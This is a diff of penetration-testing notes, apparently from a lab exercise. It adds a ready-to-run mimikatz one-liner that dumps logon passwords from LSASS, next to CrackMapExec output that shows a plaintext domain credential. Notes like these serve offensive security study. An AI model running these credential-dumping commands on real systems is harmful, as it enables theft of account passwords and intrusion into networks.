@@ -220,7 +220,6 @@ RDP         192.168.207.74  3389   CLIENT4          [+] corp.com\pete:Nexus123!
 
 ```
 
-
 ## NTLM Exfiltration with CrackMapExec
 
 * Crackmapexec is an excellent tool to remotely perform a dump of LSASS.
@@ -269,7 +268,9 @@ net user
 Get-LocalUser
 Get-ComputerInfo -Property DeviceGuardSecurityServices*
 
-Mimikatz.exe
+# Powercat Shell must run mimikatz one-liner
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+
 # Enabling SeDebugPrivilege, elevating to SYSTEM user, requires SeImpersonatePrivilege 
 privilege::debug
   20 'OK'
